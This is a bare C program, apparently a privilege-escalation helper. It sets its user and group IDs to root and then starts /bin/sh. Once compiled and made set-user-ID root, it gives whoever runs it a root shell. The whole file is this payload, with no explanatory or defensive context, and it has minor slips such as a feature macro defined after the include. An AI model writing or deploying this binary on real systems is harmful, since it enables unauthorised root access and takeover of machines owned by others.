#include <unistd.h>
#define _GNU_SOURCE

int main(void){
    setgid(0);
    setuid(0);
    execl("/bin/sh","sh",0, (char *)0);
    return 0;
}

